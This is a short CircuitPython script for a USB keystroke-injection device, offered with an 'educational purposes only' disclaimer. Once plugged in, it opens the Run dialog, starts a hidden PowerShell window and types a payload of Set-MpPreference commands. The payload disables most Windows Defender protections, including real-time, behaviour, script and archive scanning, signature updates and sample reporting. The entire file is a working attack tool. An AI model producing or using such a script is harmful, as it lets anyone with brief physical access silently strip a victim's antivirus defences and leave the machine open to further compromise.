#Disclaimer: For educational purposes only. Do not use for illegal or harmful activities. Only use in controlled environments and comply with all laws.
import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

keyboard = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(keyboard)

# Short delay to allow switching windows
time.sleep(0.5)

# Open Run dialog
keyboard.press(Keycode.WINDOWS)
keyboard.press(Keycode.R)
keyboard.release_all()

time.sleep(1)

# Launch PowerShell with admin prompt (may require user to accept UAC)
layout.write("powershell -WindowStyle Hidden")
keyboard.press(Keycode.ENTER)
keyboard.release_all()

time.sleep(2)

# Payload: Disable Windows Defender in multiple ways
payload = (
    "Set-MpPreference -DisableRealtimeMonitoring $true;"
    "Set-MpPreference -DisableBehaviorMonitoring $true;"
    "Set-MpPreference -DisableBlockAtFirstSeen $true;"
    "Set-MpPreference -DisableIOAVProtection $true;"
    "Set-MpPreference -DisablePrivacyMode $true;"
    "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true;"
    "Set-MpPreference -DisableArchiveScanning $true;"
    "Set-MpPreference -DisableIntrusionPreventionSystem $true;"
    "Set-MpPreference -DisableScriptScanning $true;"
    "Set-MpPreference -SubmitSamplesConsent 2;"
    "Set-MpPreference -MAPSReporting 0;"
)

layout.write(payload)

# Execute the payload
keyboard.press(Keycode.ENTER)
keyboard.release_all()
